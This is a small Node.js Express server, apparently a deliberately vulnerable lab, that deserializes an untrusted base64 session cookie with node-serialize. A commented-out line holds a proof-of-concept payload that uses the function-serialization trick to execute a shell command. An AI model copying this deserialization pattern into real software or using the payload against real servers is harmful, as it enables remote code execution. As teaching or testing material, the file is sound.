import express from "express";
import cookieParser from "cookie-parser";
import escapeHTML from "escape-html";
import unserialize from "node-serialize";
import serialize from "node-serialize";
import { exec } from 'child_process';

const app = express();

app.use(cookieParser());

// unserialize vulnerablity
app.get("/", (req, res) => {
    if (req.cookies.session){
        // function to check for session cookie
        const cookie = req.cookies.session;
        console.log(cookie);
        //unserialise from base64
        const obj = unserialize.unserialize(Buffer.from(cookie, "base64").toString());
        console.log(obj);
    
        res.send(`Hello ${escapeHTML(obj.username)}`);
    } else {
        // if no session cookie, set session cookie to base64 encoded string of serialized object
        const obj = { username: "unknown" };
        const serialized = serialize.serialize(obj);
        res.cookie("session", Buffer.from(serialized).toString("base64"));
        res.send("Hello unknown");
    }
});

//unserialize.unserialize({"rce":"_$$ND_FUNC$$_function(){\r\n        exec('dir', function(error, stdout, stderr) { console.log(stdout) });\r\n        }()"});

app.listen(3000, () => console.log(`Server running on port 3000`));